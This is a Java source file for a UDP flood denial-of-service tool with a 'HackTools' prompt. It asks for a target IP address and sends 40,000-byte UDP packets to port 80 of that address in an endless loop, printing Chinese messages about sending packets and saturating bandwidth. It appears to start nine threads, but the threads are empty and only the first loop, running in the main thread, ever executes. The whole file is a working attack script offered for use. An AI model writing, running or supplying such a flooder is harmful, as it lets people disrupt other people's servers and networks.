
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Scanner;

 class t9 {
    public static void main(String[] args) throws IOException, InterruptedException {
		System.out.println("Enter the target IP to attack: ");
		Scanner udp = new Scanner(System.in);
		System.out.print("Root@HackTools：>");
		String ip = udp.nextLine();
		System.out.println("Target IP is: " + ip);
		final int port = 80;
		Thread t1 = new Thread();
		{
			try
			{
				while(true)
				{
					DatagramSocket ds = new DatagramSocket();
					InetAddress ia = InetAddress.getByName(ip);
					byte[] buffer = new byte[40000];
					DatagramPacket p = new DatagramPacket(buffer, buffer.length, ia, port);
					ds.send(p);
					System.out.println("t1线程发送包到目标. ");
				}
			}
			catch(IOException e)
			{
				System.out.println("Error;宽带资源已被占满");
			}
		}
		Thread t2 = new Thread();
		{
			try
			{
				while(true)
				{
					DatagramSocket ds = new DatagramSocket();
					InetAddress ia = InetAddress.getByName(ip);
					byte[] buffer = new byte[40000];
					DatagramPacket p = new DatagramPacket(buffer, buffer.length, ia, port);
					ds.send(p);
					System.out.println("t2线程发送包到目标. ");
				}
			}
			catch(IOException e)
			{
				System.out.println("Error;宽带资源已被占满");
			}
		}
		Thread t3 = new Thread();
		{
			try
			{
				while(true)
				{
					DatagramSocket ds = new DatagramSocket();
					InetAddress ia = InetAddress.getByName(ip);
					byte[] buffer = new byte[40000];
					DatagramPacket p = new DatagramPacket(buffer, buffer.length, ia, port);
					ds.send(p);
					System.out.println("t3线程发送包到目标. ");
				}
			}
			catch(IOException e)
			{
				System.out.println("Error;宽带资源已被占满");
			}
		}
		Thread t4 = new Thread();
		{
			try
			{
				while(true)
				{
					DatagramSocket ds = new DatagramSocket();
					InetAddress ia = InetAddress.getByName(ip);
					byte[] buffer = new byte[40000];
					DatagramPacket p = new DatagramPacket(buffer, buffer.length, ia, port);
					ds.send(p);
					System.out.println("t4线程发送包到目标.");
				}
			}
			catch(IOException e)
			{
				System.out.println("Error;宽带资源已被占满");
			}
		}
		Thread t5 = new Thread();
		{
			try
			{
				while(true)
				{
					DatagramSocket ds = new DatagramSocket();
					InetAddress ia = InetAddress.getByName(ip);
					byte[] buffer = new byte[40000];
					DatagramPacket p = new DatagramPacket(buffer, buffer.length, ia, port);
					ds.send(p);
					System.out.println("t5线程发送包到目标. ");
				}
			}
			catch(IOException e)
			{
				System.out.println("Error;宽带资源已被占满");
			}
		}
		Thread t6 = new Thread();
		{
			try
			{
				while(true)
				{
					DatagramSocket ds = new DatagramSocket();
					InetAddress ia = InetAddress.getByName(ip);
					byte[] buffer = new byte[40000];
					DatagramPacket p = new DatagramPacket(buffer, buffer.length, ia, port);
					ds.send(p);
					System.out.println("t6线程发送包到目标. ");
				}
			}
			catch(IOException e)
			{
				System.out.println("Error;宽带资源已被占满");
			}
		}
		Thread t7 = new Thread();
		{
			try
			{
				while(true)
				{
					DatagramSocket ds = new DatagramSocket();
					InetAddress ia = InetAddress.getByName(ip);
					byte[] buffer = new byte[40000];
					DatagramPacket p = new DatagramPacket(buffer, buffer.length, ia, port);
					ds.send(p);
					System.out.println("t7线程发送包到目标.");
				}
			}
			catch(IOException e)
			{
				System.out.println("Error;宽带资源已被占满");
			}
		}
		Thread t8 = new Thread();
		{
			try
			{
				while(true)
				{
					DatagramSocket ds = new DatagramSocket();
					InetAddress ia = InetAddress.getByName(ip);
					byte[] buffer = new byte[40000];
					DatagramPacket p = new DatagramPacket(buffer, buffer.length, ia, port);
					ds.send(p);
					System.out.println("t8线程发送包到目标.");
				}
			}
			catch(IOException e)
			{
				System.out.println("Error;宽带资源已被占满");
			}
		}
		Thread t9 = new Thread();
		{
			try
			{
				while(true)
				{
					DatagramSocket ds = new DatagramSocket();
					InetAddress ia = InetAddress.getByName(ip);
					byte[] buffer = new byte[40000];
					DatagramPacket p = new DatagramPacket(buffer, buffer.length, ia, port);
					ds.send(p);
					System.out.println("t9线程发送包到目标. ");
				}
			}
			catch(IOException e)
			{
				System.out.println("Error;宽带资源已被占满");
			}
		}
		t1.start();
		t2.start();
		t3.start();
		t4.start();
		t5.start();
		t6.start();
		t7.start();
		t8.start();
		t9.start();
	}
	}
	
